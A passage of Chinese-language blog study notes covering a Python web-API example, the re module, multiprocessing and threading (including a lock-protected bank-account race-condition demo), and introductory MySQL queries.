href="https://www.juhe.cn/">聚合数据</a>和<a href="http://www.avatardata.cn/">阿凡达数据</a>等网站，国外的可以看看<a href="http://apis.io/">{API}Search</a>网站。</p><p>下面的例子演示了如何使用<a href="http://docs.python-requests.org/zh_CN/latest/">requests</a>模块（封装得足够好的第三方网络访问模块）访问网络API获取国内新闻，如何通过json模块解析JSON数据并显示新闻标题，这个例子使用了<a href="https://www.tianapi.com/">天行数据</a>提供的国内新闻数据接口，其中的APIKey需要自己到该网站申请。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    resp = requests.get(<span class="hljs-string">&#x27;http://api.tianapi.com/guonei/?key=APIKey&amp;num=10&#x27;</span>)<br>    data_model = json.loads(resp.text)<br>    <span class="hljs-keyword">for</span> news <span class="hljs-keyword">in</span> data_model[<span class="hljs-string">&#x27;newslist&#x27;</span>]:<br>        <span class="hljs-built_in">print</span>(news[<span class="hljs-string">&#x27;title&#x27;</span>])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure></blockquote><hr><p>Python提供了re模块来支持<strong>正则表达式</strong>相关操作，下面是re模块中的核心函数。</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>compile(pattern, flags&#x3D;0)</td><td>编译正则表达式返回正则表达式对象</td></tr><tr><td>match(pattern, string, flags&#x3D;0)</td><td>用正则表达式匹配字符串 成功返回匹配对象 否则返回None</td></tr><tr><td>search(pattern, string, flags&#x3D;0)</td><td>搜索字符串中第一次出现正则表达式的模式 成功返回匹配对象 否则返回None</td></tr><tr><td>split(pattern, string, maxsplit&#x3D;0, flags&#x3D;0)</td><td>用正则表达式指定的模式分隔符拆分字符串 返回列表</td></tr><tr><td>sub(pattern, repl, string, count&#x3D;0, flags&#x3D;0)</td><td>用指定的字符串替换原字符串中与正则表达式匹配的模式 可以用count指定替换的次数</td></tr><tr><td>fullmatch(pattern, string, flags&#x3D;0)</td><td>match函数的完全匹配（从字符串开头到结尾）版本</td></tr><tr><td>findall(pattern, string, flags&#x3D;0)</td><td>查找字符串所有与正则表达式匹配的模式 返回字符串的列表</td></tr><tr><td>finditer(pattern, string, flags&#x3D;0)</td><td>查找字符串所有与正则表达式匹配的模式 返回一个迭代器</td></tr><tr><td>purge()</td><td>清除隐式编译的正则表达式的缓存</td></tr><tr><td>re.I &#x2F; re.IGNORECASE</td><td>忽略大小写匹配标记</td></tr><tr><td>re.M &#x2F; re.MULTILINE</td><td>多行匹配标记</td></tr></tbody></table><p>关于正则表达式的更多内容，详见<a href="https://sheepandbread.github.io/2023/10/13/2023/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">此笔记</a>。</p><hr><h3 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h3><p><strong>进程</strong>是一个<strong>具有一定独立功能的程序在一个数据集合上依次动态执行的过程</strong>。</p><p><strong>线程</strong>是进程的一个<strong>执行流，是CPU调度和分派的基本单位，它是比进程更小的能独立运行的基本单位。</strong></p><p>“进程——资源分配的最小单位，线程——程序执行的最小单位”</p><p>python<strong>支持多线程和多进程</strong>，因此使用Python实现并发编程主要有3种方式：多进程、多线程、多进程+多线程。</p><p>Unix和Linux提供<code>fork()</code>系统调用来创造进程。调用<code>fork()</code>函数的是父进程，创建出的是子进程<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="子进程是父进程的一个拷贝，但是子进程拥有自己的PID">[1]</span></a></sup>。</p><p><code>fork()</code>函数非常特殊它会返回两次，父进程中可以通过<code>fork()</code>函数的<strong>返回值得到子进程的PID</strong>，而子进程中的返回值永远都是0。</p><p>Python的os模块提供了<code>fork()</code>函数。由于Windows系统没有<code>fork()</code>调用，因此要实现跨平台的多进程编程，可以使用<strong>multiprocessing</strong>模块的<code>Process</code>类来创建子进程，而且该模块还提供了更高级的封装，例如批量启动进程的进程池（<code>Pool</code>）、用于进程间通信的队列（<code>Queue</code>）和管道（<code>Pipe</code>）等。</p><p>多进程例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> getpid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time, sleep<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_task</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;启动下载进程，进程号[%d].&#x27;</span> % getpid())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;开始下载%s...&#x27;</span> % filename)<br>    time_to_download = randint(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>)<br>    sleep(time_to_download)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s下载完成! 耗费了%d秒&#x27;</span> % (filename, time_to_download))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    start = time()<br>    p1 = Process(target=download_task, args=(<span class="hljs-string">&#x27;Python从入门到住院.pdf&#x27;</span>, ))<br>    p1.start()<br>    p2 = Process(target=download_task, args=(<span class="hljs-string">&#x27;功夫足球.avi&#x27;</span>, ))<br>    p2.start()<br>    p1.join()<br>    p2.join()<br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总共耗费了%.2f秒.&#x27;</span> % (end - start))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><blockquote><p>启动下载进程，进程号[67554].<br>开始下载Python从入门到住院.pdf…<br>启动下载进程，进程号[67555].<br>开始下载功夫足球.avi…<br>功夫足球.avi下载完成! 耗费了7秒<br>Python从入门到住院.pdf下载完成! 耗费了10秒<br>总共耗费了10.11秒.</p></blockquote><p>**[process方法][1]**：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">Process([<span class="hljs-params">group</span> [, <span class="hljs-params">target</span> [, <span class="hljs-params">name</span> [, <span class="hljs-params">args</span> [, <span class="hljs-params">kwargs</span>]]]]])</span><br></code></pre></td></tr></table></figure><ol><li>p.start()：启动进程，并调用该子进程中的p.run()</li><li>p.run():进程启动时运行的方法，正是它去调用target指定的函数，我们自定义类的类中一定要实现该方法</li><li>p.terminate():强制终止进程p，不会进行任何清理操作，如果p创建了子进程，该子进程就成了僵尸进程，使用该方法需要特别小心这种情况。如果p还保存了一个锁那么也将不会被释放，进而导致死锁</li><li>p.is_alive():如果p仍然运行，返回True</li><li>p.join([timeout]):主线程等待p终止（强调：是主线程处于等的状态，而p是处于运行的状态）。timeout是可选的超时时间，需要强调的是，p.join只能join住start开启的进程，而不能join住run开启的进程</li></ol><p>也可以用<strong>subprocess模块</strong>中的类和函数来创建和启动子进程。</p><p>Python3 线程中常用的两个模块为：</p><ul><li><strong>_thread</strong></li><li><strong>threading(推荐使用)</strong></li></ul><p>thread 模块已被废弃。用户可以使用 threading 模块代替。所以，在 Python3 中不能再使用”thread” 模块。为了兼容性，Python3 将 thread 重命名为 “_thread”。</p><p>多线程下载例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time, sleep<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;开始下载%s...&#x27;</span> % filename)<br>    time_to_download = randint(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>)<br>    sleep(time_to_download)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s下载完成! 耗费了%d秒&#x27;</span> % (filename, time_to_download))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    start = time()<br>    t1 = Thread(target=download, args=(<span class="hljs-string">&#x27;Python从入门到住院.pdf&#x27;</span>,))<br>    t1.start()<br>    t2 = Thread(target=download, args=(<span class="hljs-string">&#x27;功夫足球.avi&#x27;</span>,))<br>    t2.start()<br>    t1.join()<br>    t2.join()<br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总共耗费了%.3f秒&#x27;</span> % (end - start))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><blockquote><p>开始下载Python从入门到住院.pdf…<br>开始下载功夫足球.avi…<br>功夫足球.avi下载完成! 耗费了6秒<br>Python从入门到住院.pdf下载完成! 耗费了8秒<br>总共耗费了8.002秒</p></blockquote><p>我们可以直接使用threading模块的<code>Thread</code>类来创建线程，也可以通过继承<code>Thread</code>类的方式在创建自定义的线程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time, sleep<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Download</span>(<span class="hljs-title class_ inherited__">Thread</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,filename</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self._filename = filename<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始下载%s...&quot;</span> % self._filename)<br>        time_to_download = randint(<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)<br>        sleep(time_to_download)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s下载完成！耗费%d秒！&quot;</span> % (self._filename,time_to_download))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    start = time()<br>    t1 = Download(<span class="hljs-string">&#x27;Python从入门到住院.pdf&#x27;</span>)<br>    t2 = Download(<span class="hljs-string">&#x27;功夫足球.avi&#x27;</span>)<br>    t1.start()<br>    t2.start()<br>    t1.join()<br>    t2.join()<br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总共耗费了%.3f秒&#x27;</span> % (end - start))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>多个线程可以共享进程的内存空间，所以实现多个线程间的通信相对简单，能想到最直接的方法时设定一个全局变量，多个线程共享。</p><p>但多个线程共享一个变量（资源）的时候，很有可能产生不可控的结果从而导致程序失效甚至崩溃。</p><p>如果一个资源被多个线程竞争使用，那么我们通常称之为“<strong>临界资源</strong>”，对“临界资源”的访问需要加上保护，否则资源会处于“混乱”的状态。</p><p>例如：多个账号同时向银行存1元钱。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self._balance = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">deposit</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-comment"># 计算存款后的余额</span><br>        new_balance = self._balance + money<br>        <span class="hljs-comment"># 模拟受理存款业务需要0.01秒的时间</span><br>        sleep(<span class="hljs-number">0.01</span>)<br>        <span class="hljs-comment"># 修改账户余额</span><br>        self._balance = new_balance<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">balance</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._balance<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AddMoneyThread</span>(<span class="hljs-title class_ inherited__">Thread</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, account, money</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self._account = account<br>        self._money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        self._account.deposit(self._money)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    account = Account()<br>    threads = []<br>    <span class="hljs-comment"># 创建100个存款的线程向同一个账户中存钱</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        t = AddMoneyThread(account, <span class="hljs-number">1</span>)<br>        threads.append(t)<br>        t.start()<br>    <span class="hljs-comment"># 等所有存款的线程都执行完毕</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;账户余额为: ￥%d元&#x27;</span> % account.balance)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><blockquote><p>账户余额为: ￥2元</p></blockquote><p>钱成了负数，因为我们没有对银行账户这个“临界资源”加以保护。</p><p>我们可以通过“锁”来对“临界资源”进行保护。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread, Lock<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self._balance = <span class="hljs-number">0</span><br>        self._lock = Lock()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">deposit</span>(<span class="hljs-params">self, money</span>):<br>        <span class="hljs-comment"># 先获取锁才能执行后续的代码</span><br>        self._lock.acquire()<br>        <span class="hljs-keyword">try</span>:<br>            new_balance = self._balance + money<br>            sleep(<span class="hljs-number">0.01</span>)<br>            self._balance = new_balance<br>        <span class="hljs-keyword">finally</span>:<br>            <span class="hljs-comment"># 在finally中执行释放锁的操作保证正常异常锁都能释放</span><br>            self._lock.release()<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">balance</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._balance<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AddMoneyThread</span>(<span class="hljs-title class_ inherited__">Thread</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, account, money</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self._account = account<br>        self._money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        self._account.deposit(self._money)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    account = Account()<br>    threads = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        t = AddMoneyThread(account, <span class="hljs-number">1</span>)<br>        threads.append(t)<br>        t.start()<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;账户余额为: ￥%d元&#x27;</span> % account.balance)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h4 id="单线程-异步I-x2F-O"><a href="#单线程-异步I-x2F-O" class="headerlink" title="单线程+异步I&#x2F;O"></a>单线程+异步I&#x2F;O</h4><blockquote><p>现代操作系统对I&#x2F;O操作的改进中最为重要的就是支持异步I&#x2F;O。如果充分利用操作系统提供的异步I&#x2F;O支持，就可以用单进程单线程模型来执行多任务，这种全新的模型称为事件驱动模型。Nginx就是支持异步I&#x2F;O的Web服务器，它在单核CPU上采用单进程模型就可以高效地支持多任务。在多核CPU上，可以运行多个进程（数量与CPU核心数相同），充分利用多核CPU。用Node.js开发的服务器端程序也使用了这种工作模式，这也是当下并发编程的一种流行方案。</p><p>在Python语言中，单线程+异步I&#x2F;O的编程模型称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。协程最大的优势就是极高的执行效率，因为子程序切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销。</p><p>协程的第二个优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不用加锁，只需要判断状态就好了，所以执行效率比多线程高很多。</p><p>如果想要充分利用CPU的多核特性，最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。</p></blockquote><p><a href="https://github.com/jackfrued/Python-100-Days/blob/master/Day01-15/13.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B.md#%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B">案例</a></p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p><strong>参考：<a href="https://github.com/baa-god/sql_node/blob/master/mysql/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">详细笔记</a>、<a href="http://c.biancheng.net/sql/what-is-sql.html">sql教程</a></strong></p><p>MySQL是关系型数据库。</p><p><strong>登录</strong>：mysql -u 用户名 -p 密码</p><p><strong>切换数据库</strong>：use xxx;</p><p>数据库三大范式（<a href="https://www.zhihu.com/question/34953197?sort=created">简单理解</a>）：</p><p>第一范式：表中每一列的属性都不可再分.</p><p>第二范式：满足第一范式，且非主属性完全依赖于主属性.</p><p>第三范式：满足第二范式，且每个非主属性都不传递函数依赖于主属性.</p><h2 id="查询-常见"><a href="#查询-常见" class="headerlink" title="查询(常见)"></a><strong>查询</strong>(常见)</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查询 teacher 表中不重复的 department 列</span><br><span class="hljs-comment">-- DISTINCT：删除结果集中所有重复的记录</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> department <span class="hljs-keyword">FROM</span> teacher;<br><br><span class="hljs-comment">-- 查询 score 表中成绩在60-80之间的所有行（区间查询和运算符查询）</span><br><span class="hljs-comment">-- BETWEEN xx AND xx: 查询区间, AND 表示 &quot;并且&quot;,OR表示”或者“</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> degree <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">60</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">80</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> degree <span class="hljs-operator">&gt;</span> <span class="hljs-number">60</span> <span class="hljs-keyword">AND</span> degree <span class="hljs-operator">&lt;</span> <span class="hljs-number">80</span>;<br><br><span class="hljs-comment">-- 查询 score 表中成绩为 85, 86 或 88 的行</span><br><span class="hljs-comment">-- IN: 查询规定中的多个值</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> degree <span class="hljs-keyword">IN</span> (<span class="hljs-number">85</span>, <span class="hljs-number">86</span>, <span class="hljs-number">88</span>);<br><br><span class="hljs-comment">-- 以 c_no 升序、degree 降序查询 score 表的所有行</span><br><span class="hljs-comment">-- DESC: 降序，从高到低</span><br><span class="hljs-comment">-- ASC（默认）: 升序，从低到高</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> c_no <span class="hljs-keyword">ASC</span>, degree <span class="hljs-keyword">DESC</span>;<br><br><span class="hljs-comment">-- 查询 &quot;95031&quot; 班的学生人数</span><br><span class="hljs-comment">-- COUNT: 统计</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> class <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;95031&#x27;</span>;<br><br><span class="hljs-comment">-- 查询 score 表中的最高分的学生学号和课程编号（子查询或排序查询）。</span><br><span class="hljs-comment">-- (SELECT MAX(degree) FROM score): 子查询，算出最高分</span><br><span class="hljs-keyword">SELECT</span> s_no, c_no <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> degree <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(degree) <span class="hljs-keyword">FROM</span> score);<br><br></code></pre></td></tr></table></figure><p><strong>ORDER BY</strong> 子句用于根据一个或者多个字段对查询结果（结果集）进行排序</p><p><strong>GROUP BY</strong> 子句用来根据指定的字段对结果集（选取的数据）进行分组.</p><p>借助 SQL 聚合函数，您可以对分组的数据进行再次加工，例如：</p><ul><li>SUM( ) 函数可以对指定字段的值进行求和；</li><li>COUNT( ) 函数可以计算某个分组内数据的条数；</li><li>AVG( ) 函数可以对指定字段的值求平均数。</li></ul><p><strong>LIKE</strong> 子句用于在 WHERE 语句中进行<strong>模糊匹配</strong>，它会将给定的匹配模式和某个字段进行比较，匹配成功则选取，否则不选取。</p><p><strong>HAVING</strong> 子句通常与 GROUP BY 子句一起使用，用来<strong>过滤</strong> GROUP BY 子句返回的分组结果集。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查询 score 表中至少有 2 名学生选修，并以 3 开头的课程的平均分数。</span><br><span class="hljs-comment">-- 意味着c_no 要大于2，课程名3开头</span><br><span class="hljs-keyword">SELECT</span> c_no, <span class="hljs-built_in">AVG</span>(degree), <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> c_no<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(c_no) <span class="hljs-operator">&gt;=</span> <span class="hljs-number">2</span> <span class="hljs-keyword">AND</span> c_no <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;3%&#x27;</span>;<br><br></code></pre></td></tr></table></figure><p>多表查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查询所有学生的 name，以及该学生在 score 表中对应的 c_no 和 degree 。</span><br><span class="hljs-comment">-- FROM...: 表示从 student, score 表中查询</span><br><span class="hljs-comment">-- WHERE 的条件表示为，只有在 student.no 和 score.s_no 相等时才显示出来。</span><br><span class="hljs-keyword">SELECT</span> name, c_no, degree <span class="hljs-keyword">FROM</span> student, score <br><span class="hljs-keyword">WHERE</span> student.no <span class="hljs-operator">=</span> score.s_no;<br></code></pre></td></tr></table></figure><p><strong>AS</strong> 关键字用于为表或字段<strong>起一个临时的别名。</strong>别名是临时的，它仅在当前 SQL 语句中奏效，数据库中的实际表名和字段名不会更改。</p><p>通常在下列情况中使用别名：</p><ul><li>有两个名字重复的表，需要为其中一个表起一个别名加以区分，比如 <a href="http://c.biancheng.net/sql/self-join.html">SELF 